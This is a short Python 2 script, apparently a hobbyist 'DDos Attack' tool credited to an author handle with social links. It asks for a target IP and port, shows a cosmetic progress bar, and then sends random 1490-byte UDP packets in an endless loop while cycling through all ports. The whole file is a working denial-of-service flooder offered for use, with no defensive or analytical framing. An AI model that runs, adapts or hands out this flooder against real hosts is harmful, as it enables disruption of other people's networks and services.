import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
h0rn3t = random._urandom(1490)
#############

os.system("clear")
print("\033[1;32;40ma")
os.system("clear")
os.system("figlet DDos Attack")


print "\033[1;36;40mAuthor   : H0RN3T-SP1D3RS"
print "Github   : https://github.com/h0rn3t-sp1d3rs"
print "Facebook : https://www.facebook.com/h0rn3t.sp1d3rs"
print
ip = raw_input("\033[1;32;40mIP Target :\033[1;33;40m ")
port = input("\033[1;32;40mPort       :\033[1;33;40m ")

os.system("clear")
os.system("figlet DDos Attack")
print "\033[1;32;40m[                    ] 0% "
time.sleep(3)
print "\033[1;33;40m[=====               ] 25%"
time.sleep(3)
print "\033[1;34;40m[==========          ] 50%"
time.sleep(3)
print "\033[1;35;40m[===============     ] 75%"
time.sleep(3)
print "\033[1;36;40m[====================] 100%\033[1;32;40m"
time.sleep(2)
sent = 0
while True:
     sock.sendto(h0rn3t, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
